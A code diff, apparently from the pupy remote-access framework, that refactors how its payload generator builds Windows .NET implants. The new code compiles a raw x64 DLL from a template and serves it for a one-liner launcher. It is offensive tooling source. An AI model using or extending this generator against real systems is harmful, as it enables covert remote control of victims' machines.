@@ -30,7 +30,8 @@ from io import BytesIO
 
 from pupylib.utils.network import get_listener_ip, get_listener_port
 from pupylib.utils.jarsigner import jarsigner
-from pupylib.payloads import dependencies, dotnet
+from pupylib.payloads import dependencies
+from pupylib.payloads.dotnet import dotnet_serve_payload, DotNetPayload
 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
 from pupylib.payloads.rubber_ducky import rubber_ducky
 from pupylib.utils.obfuscate import compress_encode_obfs
@@ -737,19 +738,22 @@ def pupygen(args, config, pupsrv, display):
     elif args.format == 'csharp':
         if args.os!="windows" or args.arch!="x64":
             raise ValueError("This format only support windows x64. x86 payloads are not implemented")
-        dn=dotnet.DotNetPayload(display, conf, outpath=outpath, output_dir=args.output_dir)
+        rawdll = generate_binary_from_template(display, conf, 'windows', arch='x64', shared=True)[0]
+        dn=DotNetPayload(display, conf, rawdll, outpath=outpath, output_dir=args.output_dir)
         outpath = dn.gen_source()
     elif args.format == '.NET':
         if args.os!="windows" or args.arch!="x64":
             raise ValueError("This format only support windows x64. x86 payloads are not implemented")
-        dn=dotnet.DotNetPayload(display, conf, outpath=outpath, output_dir=args.output_dir)
+        rawdll = generate_binary_from_template(display, conf, 'windows', arch='x64', shared=True)[0]
+        dn=DotNetPayload(display, conf, rawdll, outpath=outpath, output_dir=args.output_dir)
         outpath = dn.gen_exe()
         if outpath is None:
             raise NoOutput()
     elif args.format == '.NET_oneliner':
         i = conf["launcher_args"].index("--host")+1
         link_ip = conf["launcher_args"][i].split(":",1)[0]
-        dotnet.serve_payload(display, pupsrv, conf, link_ip=link_ip)
+        rawdll = generate_binary_from_template(display, conf, 'windows', arch='x64', shared=True)[0]
+        dotnet_serve_payload(display, pupsrv, rawdll, conf, link_ip=link_ip)
 
         raise NoOutput()
 
